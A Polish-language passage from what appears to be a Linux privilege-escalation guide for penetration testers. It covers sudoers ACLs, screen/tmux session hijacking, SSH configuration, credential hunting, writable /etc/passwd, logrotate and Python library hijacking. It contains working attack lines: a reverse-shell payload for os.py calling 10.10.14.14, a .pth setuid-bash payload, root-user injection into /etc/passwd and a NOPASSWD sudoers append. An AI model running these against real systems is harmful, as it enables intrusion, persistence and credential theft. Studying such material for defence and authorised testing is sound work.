Częstą błędną konfiguracją jest plik należący do roota w `/etc/sudoers.d/` z uprawnieniami `440`, który mimo to zapewnia użytkownikowi o niskich uprawnieniach dostęp do zapisu za pośrednictwem ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Jeśli widzisz coś takiego jak `user:alice:rw-`, użytkownik może dopisać regułę sudo pomimo restrykcyjnych bitów uprawnień:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

To ścieżka utrwalania dostępu przez ACL i eskalacji uprawnień o dużym wpływie, ponieważ łatwo ją przeoczyć podczas przeglądu ograniczonego do `ls -l`.

## Otwarte sesje powłoki

Dostęp do GNU Screen między użytkownikami zależy od **konfiguracji i ACL działającej sesji**, a nie tylko od jej wersji. [Dokumentacja GNU Screen](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) informuje, że program musi być skompilowany z obsługą wielu użytkowników; `multiuser on` oraz uprawnienie przyznane przez `acladd` lub odpowiednie `aclchg` pozwalają innemu użytkownikowi dołączyć do sesji. [Podręcznik wymaga również setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) do wyszukiwania sesji między użytkownikami. Widoczny socket należący do roota lub sam plik binarny `screen` z SUID nie potwierdzają, że można dołączyć do powłoki roota. Zanim uznasz to za eskalację uprawnień, sprawdź, czy działająca sesja obsługuje wielu użytkowników, czy bieżący użytkownik ma efektywne uprawnienia do wprowadzania danych lub wykonywania poleceń oraz czy powłoka w tej sesji działa jako użytkownik uprzywilejowany.

### screen sessions hijacking

**Lista sesji screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen session hijacking - Lokalizacje gniazd (niektóre systemy udostępniają jedno jako dowiązanie symboliczne do drugiego): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Dołącz do sesji**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Był to problem występujący w **starych wersjach tmux**. Nie udało mi się przejąć sesji tmux (v2.1) utworzonej przez użytkownika root, korzystając z konta bez uprawnień.

**Wyświetlanie sesji tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Lokalizacje gniazd (niektóre systemy udostępniają jedno jako dowiązanie symboliczne do drugiego) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Wyświetl listę przy użyciu tego gniazda; możesz uruchomić sesję tmux w tym gnieździe...](<../../images/image (837).png>)

**Dołącz do sesji**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Sprawdź **Valentine box from HTB**, aby zobaczyć przykład.

## SSH

### Przewidywalny PRNG w Debian OpenSSL - CVE-2008-0166

Klucze wygenerowane przy użyciu podatnych kompilacji OpenSSL w Debianie lub jego pochodnych w historycznym okresie podatności mogą mieć przewidywalną losowość; obecna dystrybucja hosta ani poprawiona wersja OpenSSL nie pozwalają ustalić, jak wygenerowano starszy klucz. Sprawdź **konkretny klucz** pod kątem odpowiedniej historycznej czarnej listy i jego pochodzenia. Podręcznik Debiana [`ssh-vulnkey`](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) opisuje sprawdzanie kluczy publicznych i plików `authorized_keys`, a [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) odnotowuje poprawkę OpenSSL. Wpis w pliku `authorized_keys` konta uprzywilejowanego jest tropem prowadzącym do eskalacji tylko wtedy, gdy można odzyskać odpowiadający mu klucz prywatny, a efektywna konfiguracja SSH nadal akceptuje ten klucz dla tego konta; słaby klucz **hosta** sam w sobie nie jest poświadczeniem logowania. Wymień przejęte klucze i usuń ich stare autoryzacje.

### Interesujące wartości konfiguracji SSH

- **PasswordAuthentication:** Określa, czy uwierzytelnianie hasłem jest dozwolone. Domyślna wartość w upstream OpenSSH to `yes`; konfiguracja dystrybucji może ją nadpisać.
- **PubkeyAuthentication:** Określa, czy uwierzytelnianie kluczem publicznym jest dozwolone. Domyślna wartość to `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer pozwala logować się na konta z pustymi hasłami. Domyślna wartość to `no`.

### Pliki kontroli logowania

Te pliki wpływają na to, kto może się logować i w jaki sposób:

- **`/etc/nologin`**: jeśli istnieje, blokuje logowanie użytkownikom innym niż root i wyświetla jego komunikat.
- **`/etc/securetty`**: ogranicza miejsca, z których root może się logować (lista dozwolonych TTY).
- **`/etc/motd`**: baner wyświetlany po zalogowaniu (może leakować informacje o środowisku lub szczegóły dotyczące konserwacji).

### PermitRootLogin

Określa, czy root może logować się przez ssh. Domyślna wartość w upstream OpenSSH to `prohibit-password`; konfiguracja dystrybucji może ją nadpisać. Możliwe wartości:

- `yes`: root może logować się za pomocą hasła i klucza prywatnego
- `without-password` lub `prohibit-password`: root może logować się tylko za pomocą klucza prywatnego
- `forced-commands-only`: Root może logować się tylko za pomocą klucza prywatnego i jeśli określono opcje commands
- `no` : nie

### Zaufane urzędy certyfikacji użytkowników SSH

`TrustedUserCAKeys` wskazuje klucze publiczne, którym sshd ufa przy podpisywaniu certyfikatów **użytkowników**. Jeśli odpowiadający im prywatny klucz CA jest dostępny do odczytu dla użytkownika z niższymi uprawnieniami, sprawdź, kto może uzyskać certyfikat i jako które podmioty konta może on uwierzytelniać. `AuthorizedPrincipalsFile` lub `AuthorizedPrincipalsCommand` mogą ograniczać akceptowane nazwy; jeśli nie skonfigurowano żadnego z nich, certyfikat musi zawierać nazwę konta docelowego. `PermitRootLogin prohibit-password` blokuje uwierzytelnianie roota hasłem, ale nadal może zezwalać na uwierzytelnianie certyfikatem. Sama ścieżka do ujawnionego klucza nie dowodzi dostępu: potwierdź parę kluczy publicznego i prywatnego, efektywne reguły `Match`, politykę konta, hasło do klucza, unieważnienie oraz akceptowane algorytmy podpisu. Nie umieszczaj bajtów klucza prywatnego w wynikach enumeracji. Zobacz [podręcznik konfiguracji serwera OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Prywatny klucz CA może być użyteczny również **bez możliwości odczytu** przez bieżącego użytkownika, jeśli reguła delegowania uprawnień pozwala mu wywołać nieograniczony [program do podpisywania certyfikatów, taki jak `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s), w ramach tożsamości właściciela klucza. Porównaj dokładnie dozwolone polecenie i argumenty z dostępem konta podpisującego do klucza, zaufanym publicznym kluczem CA w efektywnej konfiguracji sshd, podmiotem akceptowanym dla konta docelowego, okresem ważności certyfikatu oraz polityką logowania tego konta. Delegowane polecenie podpisujące ani sam zaufany plik CA nie dowodzą dostępu do innego konta; podczas pasywnej enumeracji nie podpisuj testowego certyfikatu.

Informacje o osobnej ścieżce zaufania CA dla poszczególnych kont znajdziesz w sekcji [Niejednoznaczność separatora podmiotu certyfikatu SSH](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion).

### AuthorizedKeysFile

Określa pliki zawierające klucze publiczne, których można używać do uwierzytelniania użytkownika. Może zawierać tokeny, takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Możesz wskazać ścieżki bezwzględne** (zaczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Ta konfiguracja oznacza, że jeśli spróbujesz zalogować się przy użyciu **prywatnego** klucza użytkownika „**testusername**”, ssh porówna klucz publiczny Twojego klucza z kluczami znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding pozwala **używać lokalnych kluczy SSH zamiast pozostawiać klucze** (bez haseł!) na serwerze. Dzięki temu będziesz móc **przejść** przez ssh **do hosta**, a następnie z niego **przejść na inny** host, **używając** **klucza** znajdującego się na Twoim **początkowym hoście**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w następujący sposób:

```
Host example.com
  ForwardAgent yes
```

Zauważ, że jeśli `Host` ma wartość `*`, za każdym razem, gdy użytkownik przechodzi na inną maszynę, jej host będzie mógł uzyskać dostęp do kluczy (co stanowi zagrożenie dla bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisać te opcje** i zezwolić na tę konfigurację lub jej zabronić.\
Plik `/etc/sshd_config` może **zezwolić** na przekazywanie ssh-agent lub go **zabronić** za pomocą słowa kluczowego `AllowAgentForwarding` (domyślnie jest dozwolone).

Jeśli znajdziesz w środowisku skonfigurowane Forward Agent, przeczytaj poniższą stronę, ponieważ **możesz wykorzystać tę konfigurację do eskalacji uprawnień**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interesujące pliki

### Pliki profili

Plik `/etc/profile` oraz pliki w katalogu `/etc/profile.d/` to **skrypty uruchamiane, gdy użytkownik otwiera nową powłokę**. Dlatego jeśli możesz **zapisywać lub modyfikować którykolwiek z nich, możesz eskalować uprawnienia**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Jeśli znajdziesz jakiś nietypowy skrypt profilu, sprawdź, czy zawiera **wrażliwe informacje**.

### Pliki Passwd/Shadow

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inne nazwy lub mogą istnieć ich kopie zapasowe. Dlatego zaleca się **znaleźć wszystkie** takie pliki i **sprawdzić, czy można je odczytać**, aby ustalić, **czy zawierają hashe**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Czasami możesz znaleźć **hashe haseł** w pliku `/etc/passwd` (lub jego odpowiedniku)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Zapisywalny /etc/passwd

Najpierw wygeneruj hasło za pomocą jednego z następujących poleceń.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Następnie dodaj użytkownika `hacker` i ustaw wygenerowane hasło.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Np.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su` z danymi `hacker:hacker`

Możesz też użyć poniższych wierszy, aby dodać użytkownika testowego bez hasła.\
OSTRZEŻENIE: może to obniżyć obecny poziom bezpieczeństwa maszyny.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

UWAGA: Na platformach BSD `/etc/passwd` znajduje się w plikach `/etc/pwd.db` i `/etc/master.passwd`; ponadto `/etc/shadow` ma nazwę `/etc/spwd.db`.

Sprawdź, czy możesz **zapisywać w niektórych wrażliwych plikach**. Na przykład, czy możesz zapisywać w jakimś **pliku konfiguracyjnym usługi**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Na przykład, jeśli maszyna uruchamia serwer **tomcat** i możesz **zmodyfikować plik konfiguracji usługi Tomcat w katalogu /etc/systemd/,** możesz zmodyfikować linie:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Twój backdoor zostanie uruchomiony przy następnym uruchomieniu tomcata.

### Sprawdź katalogi

Następujące katalogi mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Nietypowe lokalizacje/pliki należące do użytkownika

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Pliki zmodyfikowane w ciągu ostatnich minut

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Pliki baz danych SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

W przypadku czytelnych baz danych aplikacji sprawdź nazwy tabel i kolumn pod kątem nazw użytkowników i hashy haseł. Znalezienie hasha, odzyskanie hasła i potwierdzenie jego ponownego użycia dla konta lokalnego to osobne kroki; sam 32-znakowy ciąg szesnastkowy nie wystarcza, by stwierdzić, że jest to MD5 ani że zapewnia dostęp do konta.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Jeśli w czytelnej historii powłoki znajduje się polecenie `sudo`, po którym następuje krótki wiersz przypominający hasło, ręcznie sprawdź sąsiednie wiersze. Hasło wpisane w zwykłym monicie `sudo` nie jest zapisywane w historii powłoki; kolejny wiersz może być przypadkowym wejściem do powłoki, ale nie stanowi dowodu, że hasło jest prawidłowe. Znacznik `.sudo_as_admin_successful` odnotowuje wcześniejsze użycie, a nie aktualne uprawnienia.

### Ukryte pliki

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Skrypty/pliki binarne w PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Pliki internetowe**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Kopie zapasowe**

Sprawdzaj czytelne pliki w katalogach kopii zapasowych, a także pliki, których **nazwy** zawierają `backup`: archiwum o nieczytelnej nazwie lub z rozszerzeniem wskazującym na szyfrowanie nadal może ujawniać stare dane aplikacji. Zaszyfrowane archiwum jest jedynie potencjalnym źródłem ujawnienia. Odzyskanie hasła, sprawdzenie zawartości archiwum, odzyskanie hasha aplikacji i ponowne użycie tego hasła do konta Unix to odrębne kroki, które trzeba zweryfikować; hash w archiwum nie dowodzi, że można zalogować się lokalnie.

Czytelne kopie zapasowe maszyn wirtualnych również wymagają sprawdzenia. Plik konfiguracyjny VirtualBox `.vbox` może wskazywać podłączone obrazy `.vdi` i zawierać metadane klucza szyfrowania dysku; [VirtualBox dokumentuje, że zaszyfrowany klucz danych jest przechowywany w konfiguracji maszyny wirtualnej](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Zanim będzie możliwe sprawdzenie dysku w trybie offline, dostępne muszą być zarówno konfiguracja, jak i obraz. Wolumin gościa może mieć własną [warstwę szyfrowania LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), wymagającą osobnego klucza. Nawet po autoryzowanym odszyfrowaniu stare skrypty lub konfiguracja mogą zawierać hasło; zanim uznasz to za lokalną eskalację uprawnień, ustal, czy dane poświadczenia są aktualne dla konta na hoście i czy efektywna polityka `sudo` tego konta zezwala na wykonanie polecenia z podwyższonymi uprawnieniami. Podczas pasywnej enumeracji zinwentaryzuj ścieżki i uprawnienia bez kopiowania, odszyfrowywania ani montowania obrazów.

Przed wypakowaniem czegokolwiek sprawdź listę nazw plików w czytelnym archiwum: mogą się w nim znajdować ukryte pliki uwierzytelniające, kody odzyskiwania lub klucze SSH, nawet jeśli ich bieżące kopie są chronione. Nazwy plików wskazują jedynie trop; osobno zweryfikuj zawartość i ewentualne ponowne użycie danych logowania.

Priorytetowo sprawdzaj **czytelne archiwa należące do innego użytkownika** w katalogach kopii zapasowych, zwłaszcza archiwa należące do roota oraz te dostępne dzięki członkostwu w grupie. Stare archiwum może zawierać konfigurację lub sekret uwierzytelniający, nawet jeśli bieżąca kopia jest chroniona. W przypadku lokalnego interfejsu do zarządzania kopiami zapasowymi, takiego jak [Backrest](https://garethgeorge.github.io/backrest/), sprawdź efektywne konto usługi oraz to, czy użytkownik o niższych uprawnieniach może odczytać jej konfigurację lub uwierzytelnić się w interfejsie. Jego [haki](https://garethgeorge.github.io/backrest/docs/hooks) i [interfejs poleceń restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) mogą działać z uprawnieniami usługi do plików i poleceń; sam nasłuch na loopback nie przesądza o skutkach. `passwordBcrypt` w Backrest to zakodowany w base64 hash bcrypt, a nie hasło w postaci jawnej; opisano go w [kodzie uwierzytelniania](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go). Zanim uznasz ujawnione archiwum lub interfejs za granicę uprawnień, potwierdź tożsamość usługi, użyteczność danych logowania oraz dostęp do odpowiedniego planu lub repozytorium.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Znane pliki zawierające hasła

Przeczytaj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), który wyszukuje **różne pliki mogące zawierać hasła**.\
**Innym interesującym narzędziem**, którego możesz użyć, jest [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — aplikacja open source służąca do odzyskiwania wielu haseł zapisanych lokalnie na komputerach z systemami Windows, Linux i Mac.

Jeśli plik `/etc/guacamole/guacamole.properties` jest dostępny do odczytu, sprawdź ustawienia połączenia z bazą danych `mysql-*`, `postgresql-*` lub `sqlserver-*`. Jeśli konto ma uprawnienia do odczytu tabel Guacamole JDBC, tabela `guacamole_connection_parameter` może zawierać zapisane wartości `username`, `password`, `private-key` lub `passphrase` dla SSH. Zacznij od identyfikatorów połączeń i nazw parametrów, a następnie sprawdź tylko odpowiednie wiersze; zapisana wartość może być dynamicznym tokenem lub odwołaniem do sejfu, a nie wielokrotnego użytku sekretem. Zobacz [schemat Guacamole JDBC](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) oraz [parametry połączenia SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

Menedżer haseł [pswm](https://github.com/Julynx/pswm#usage) domyślnie przechowuje zaszyfrowany sejf w `~/.local/share/pswm/pswm`. Jeśli widzisz sejf innego użytkownika, sprawdź jego właściciela oraz to, czy Twoje konto rzeczywiście ma do niego dostęp do odczytu. Sama ścieżka do sejfu nie ujawnia danych logowania; odzyskanie hasła głównego, znalezienie hasła do konta, którego można użyć ponownie, i potwierdzenie uprawnień tego konta to odrębne kroki.

Domyślną bazą danych [Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) jest `~/.passpie/`, zawierająca plik `.keys` z pękiem kluczy oraz zaszyfrowane pliki poświadczeń `.pass` w katalogach grup. Widoczny katalog bazy danych to jedynie wskazówka dotycząca ścieżki: potwierdź dostęp do klucza i odpowiedniego zaszyfrowanego wpisu, sprawdź, czy wymagane jest hasło główne, oraz ustal, czy odzyskane poświadczenie należy do konta z większymi uprawnieniami. Passpie obsługuje również [niestandardowe ścieżki baz danych](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), więc domyślna ścieżka nie obejmuje wszystkich możliwości. Automatyczne wyszukiwanie powinno wyświetlać metadane bez eksportowania poświadczeń ani wypisywania materiału kluczowego.

### Logi

Jeśli możesz odczytywać logi, możesz znaleźć **interesujące/poufne informacje**. Im bardziej nietypowy jest log, tym ciekawszy będzie (prawdopodobnie).\
Ponadto niektóre źle skonfigurowane (z backdoorem?) **logi audytowe** mogą umożliwiać **zapisywanie haseł** w logach audytowych, jak wyjaśniono w tym artykule: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Aby **odczytywać logi, grupa** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) będzie bardzo pomocna.

### Pliki powłoki

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Generic Creds Search/Regex

Warto też sprawdzić, czy pliki zawierają słowo „**password**” w **nazwie** lub treści, a także poszukać adresów IP i e-maili w logach oraz regexów hashy.\
Nie będę tu opisywać, jak to zrobić, ale jeśli Cię to interesuje, możesz sprawdzić ostatnie kontrole wykonywane przez [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki z prawem zapisu

### Python library hijacking

Jeśli wiesz, **skąd** zostanie uruchomiony skrypt Pythona, i **możesz zapisywać w** tym folderze albo modyfikować biblioteki Pythona, możesz zmodyfikować bibliotekę OS i ją zbackdoorować (jeśli możesz zapisywać w miejscu, z którego uruchomiony zostanie skrypt Pythona, skopiuj i wklej bibliotekę os.py).

Aby **zbackdoorować bibliotekę**, dodaj na końcu biblioteki os.py następujący wiersz (zmień IP i PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### Plik `.pth` z prawem zapisu przetwarzany przez `site.addsitedir()`

Nie traktuj `site.addsitedir(DIR)` jako odpowiednika `sys.path.append(DIR)`. Ta funkcja przetwarza również każdy plik `*.pth` w `DIR`. Wiersz zaczynający się od `import`, po którym następuje spacja lub tabulator, jest wykonywany jako kod Python. Wiersze zawierające ścieżki są natomiast rozwiązywane względem katalogu site i dodawane tylko wtedy, gdy wskazane ścieżki istnieją.<sup>[[38]](#references)</sup>

Dochodzi do eskalacji uprawnień, gdy program Python dozwolony przez sudo lub w inny sposób działający z podwyższonymi uprawnieniami wywołuje `site.addsitedir()` dla katalogu, który jest zapisywalny przez bieżącego użytkownika lub jedną z grup, do których należy. Kod z pliku `.pth` jest wykonywany podczas konfigurowania ścieżki importu przez program działający z podwyższonymi uprawnieniami, zanim program rozpocznie wykonywanie swojej zwykłej czynności.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Wykonywalna zawartość pliku `.pth` musi mieścić się w jednym wierszu, ale średniki pozwalają umieścić w nim kilka instrukcji. Na przykład ścieżka wykonywana z uprawnieniami roota może utworzyć kopię Basha z ustawionym setuid; uruchom Basha z opcją `-p`, aby zachował efektywny identyfikator.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

Opcja `-S` wyłącza tylko automatyczną inicjalizację `site` przez Pythona. Nie chroni programu, który jawnie importuje `site` i wywołuje `site.addsitedir()`. Usuń katalogi zapisywalne przez atakującego z uprzywilejowanych ścieżek importu i wymagaj, aby katalog oraz jego pliki `.pth` należały wyłącznie do uprzywilejowanego administratora i były zapisywalne tylko przez niego.<sup>[[38]](#references)[[39]](#references)</sup>

### Wykorzystanie logrotate

Uprzywilejowane zadanie `logrotate` może utworzyć ścieżkę umożliwiającą zapis do plików należących do innych użytkowników, jeśli podczas rotacji faktycznie obraca log znajdujący się w katalogu, który użytkownik o niższych uprawnieniach może podmienić lub przekierować. Sama możliwość zapisu do logu jest tylko wskazówką. Sprawdź dokładną aktywną regułę oraz jej dyrektywy `create`, `olddir` i `su`; efektywną tożsamość użytkownika harmonogramu; prawa zapisu i wyszukiwania do katalogu nadrzędnego logu; a także to, czy zainstalowana kompilacja i polityka zezwalają na zmianę miejsca docelowego. Późniejsza uprzywilejowana powłoka musi również wczytać utworzony plik, aby zapis do pliku startowego doprowadził do wykonania poleceń. Sprawdź harmonogram, regułę, wersję/pakiet oraz metadane ścieżek, nie wywołując rotacji ani nie próbując wykorzystać wyścigu.

> [!TIP]
> Nie traktuj wersji `3.18.0` ani żadnego innego numeru wersji jako jedynej granicy podatności. [Dziennik zmian upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) odnotowuje utwardzanie obsługi katalogów i symlinków w kilku wydaniach, a dystrybucje mogą przenosić poprawki do starszych wersji. [Podręcznik upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) zaleca użycie `su`, gdy root obraca logi w katalogach kontrolowanych przez użytkowników nieuprzywilejowanych; zweryfikuj efektywną regułę i rzeczywiste zachowanie.

Bardziej szczegółowe informacje o podatności można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Możesz wykorzystać tę podatność za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta podatność jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logi nginx),** dlatego gdy znajdziesz możliwość modyfikowania logów, sprawdź, kto nimi zarządza, i czy możesz podnieść uprawnienia, zastępując logi symlinkami.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Odnośnik do podatności:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Plik `ifcfg-*` jest wskazówką do dalszej weryfikacji, jeśli użytkownik o niższych uprawnieniach może go utworzyć lub zmienić **i** uprzywilejowana ścieżka aktywacji sieci odczyta właśnie ten plik. Sprawdź efektywne uprawnienia do pliku i katalogu, wybrany interfejs, zainstalowaną implementację `ifup`/`ifdown` oraz to, kto ją wywołuje. Sam zapisywalny plik nie powoduje wykonania kodu. [Podręcznik sieciowy Red Hat dla RHEL 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) rozróżnia starsze skrypty sieciowe od NetworkManager: ten drugi sam nie uruchamia tych pierwszych. [Dokumentacja RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) podaje, że domyślne `ifup`/`ifdown` korzystają z NetworkManager, natomiast opcjonalny pakiet starszych skryptów dostarcza skrypty powłoki.

